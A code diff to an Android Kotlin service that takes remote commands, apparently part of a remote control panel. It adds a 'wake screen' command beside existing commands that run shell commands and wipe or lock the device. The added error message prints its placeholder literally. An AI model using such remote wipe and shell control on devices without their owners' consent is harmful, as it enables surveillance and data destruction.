@@ -257,6 +257,7 @@ class ConnectorService : Service() {
             cmd == "get_processes"       -> Pair(runShell("ps -A"), "command_result")
 
             // ── Device control ──
+            cmd == "wake_screen"         -> Pair(wakeScreen(), "command_result")
             cmd == "lock_screen"         -> Pair(lockScreen(), "command_result")
             cmd == "wipe_device"         -> Pair(wipeDevice(), "command_result")
             cmd.startsWith("vibrate:")   -> Pair(vibrateCustom(cmd.removePrefix("vibrate:").toIntOrNull() ?: 1), "command_result")
@@ -591,6 +592,20 @@ class ConnectorService : Service() {
             if (dpm.isAdminActive(admin)) { dpm.lockNow(); "🔒 Layar dikunci" }
             else "⚠️ Device Admin belum aktif."
         } catch (e: Exception) { "Error: ${e.message}" }
+    }
+
+    private fun wakeScreen(): String {
+        return try {
+            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+            @Suppress("DEPRECATION")
+            val wl = pm.newWakeLock(
+                android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
+                "IWXPanel:WakeScreen"
+            )
+            wl.acquire(3000L)
+            wl.release()
+            "\u2600\uFE0F Layar dinyalakan"
+        } catch (e: Exception) { "Error: \${e.message}" }
     }
 
     private fun wipeDevice(): String {
